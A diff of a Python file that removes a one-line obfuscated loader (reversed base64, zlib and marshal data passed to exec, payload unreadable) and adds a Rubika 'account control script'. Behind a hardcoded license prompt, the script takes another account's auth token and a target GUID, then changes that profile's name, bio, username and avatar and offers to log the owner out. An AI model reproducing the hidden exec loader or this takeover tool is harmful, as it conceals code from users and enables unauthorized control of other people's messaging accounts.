@@ -1,1 +1,122 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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'))
+#pylint:disable=W0401
+from rubika.client import *
+import rainbowtext, pyfiglet
+from time import *
+from numbers import *
+import requests
+import os
+import datetime 
+import time
+import socket
+import sys
+from json import dumps,loads
+yellow = "\033[93m"
+green = "\033[32m"
+red = "\033[31m"
+blue = "\033[36m"
+pink = "\033[35m"
+white = "\033[00m"
+# mark
+w = str(datetime.datetime.now())
+mark = '\x1b[38;5;4m' #blue
+mark1 = '\x1b[48;5;15m' # blake for back ground
+mark2 = '\x1b[0m' #end ..	
+def sprint(str):
+   for c in str + '\n':
+     sys.stdout.write(c)
+     sys.stdout.flush()
+     time.sleep(0.09)
+print(f"{green}")
+print("--------------------------------")     	
+seven=input(f'{red}[◐]{green}License -> ')
+if seven =='monji024':
+	print(f"""{yellow}[~] {red}That's right, friend""")
+else:
+		while True:
+			print(f'{red}[~] error ')
+		exit()
+sprint(f'''{green}Welcome to the account control script''')
+j = (f"""{white}
+⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠈⠘⠩⢿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿
+⣿⣿⣿⣿⠄⠄⣀⣤⣤⣤⣄⡀⠄⠄⠄⠄⠙⣿⣿⣿
+⣿⣿⣿⣿⡀⢰⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠹⢿⣿
+⣿⣿⣿⣿⣿⡞⠻⠿⠟⠋⠉⠁⣤⡀⠄⠄⠄⠄⠄⠄
+⣿⣿⣿⣿⣿⣿⣶⢼⣷⡤⣦⣿⠛⡰⢃⠄⠐⠄⠄⢸
+⣿⣿⣿⣿⣿⣿⣿⡯⢍⠿⢾⡿⣸⣿⠰⠄⢀⠄⠄⡬
+⣿⣿⣿⣿⣿⣿⣿⣴⣴⣅⣾⣿⣿⡧⠦⡶⠃⠄⠠⢴
+⣿⣿⣿⣿⠿⠍⣿⣿⣿⣿⣿⣿⣿⢇⠟⠁⠄⠄⠄⠄
+⠟⠛⠉⠄⠄⠄⡽⣿⣿⣿⣿⣿⣯⠏⠄⠄⠄⠄⠄⠄
+⠄⠄⠄⢀⣾⣾⣿⣤⣯⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄
+{pink}Rubika ➫ @monji024
+
+{red}I LOVE YOU💔
+
+{mark1}{red}
+『{w}』
+{mark2}
+""")
+for n in j:
+    sys.stdout.write(n)
+    sys.stdout.flush()
+    time.sleep(0.009)	
+print(f"{green}")
+print("--------------------------------")  
+time.sleep(0.5)
+z = input (f"{red}[~]{green}Installing the library -> <y/n> :")
+
+if z == "y":
+	os.system("pip install colorama && pip install rubika && pip install pyfiglet && pip install datetime && pip install rainbowtext && pip install requests")
+print (f"{yellow}")
+if z == "n":
+    print()
+    print("\r ok montaze bmon  ..",end="",flush=False)
+    time.sleep(1)
+    print("\r ok montaze bmon  ...",end="",flush=False)
+    time.sleep(1)
+    print("\r ok montaze bmon  ....",end="",flush=False)
+    time.sleep(1)
+    print("\r ok montaze bmon  .....",end="",flush=False)
+    time.sleep(1)
+    print("\r ok montaze bmon        ",end="",flush=False)
+    time.sleep(0.8)
+    print("\r ok montaze bmon  .",end="",flush=False)
+    time.sleep(0.9)
+    print("\r ok montaze bmon  .. ",end="",flush=False)
+    time.sleep(0.5)
+    print("\r ok montaze bmon  ...",end="",flush=False)
+    time.sleep(0.7)
+    print("\r ok montaze bmon  ....",end="",flush=False)
+    time.sleep(1)
+    print("\r ok montaze bmon  .....",end="",flush=False)
+    time.sleep(0.7)
+    print("\r ok montaze bmon           ",end="",flush=False)
+print("")    
+print("")    
+print("--------------------------------")  
+print(rainbowtext.text(pyfiglet.figlet_format('monji')))
+p = input(f"{red}[~]{yellow}auth accuont ro vared kon ->")
+bot = Bot("app_name",auth=p)
+print("--------------------------------")  
+d = input(f"{red}[~]{blue}guid accuont fard ro vared kon ->")
+target =d
+print("--------------------------------")  
+m = input(f"{red}[~]{green}name change😈 ->")
+bot.editProfile(first_name=m)
+print("--------------------------------")  
+h = input(f"{green}[~]{blue}bio change ->")
+bot.editProfile(bio=h)
+print("--------------------------------")  
+q = input(f"{red}[~]{green}Change ID ->")
+bot.editProfile(username=q)
+print("--------------------------------")  
+e = input(f"{red}[~]{yellow}Change profile ->")
+bot.uploadAvatar(target,e)
+print("--------------------------------")  
+monji=input("{red}[~]{yellow}Throwing out of the account -> <y/n>")
+if monji == "y":
+	os.system("logout()")
+if monji == "n":
+	os.system("clear")
+print("--------------------------------")  
+print(f"{green}[+ ok⸽end]")
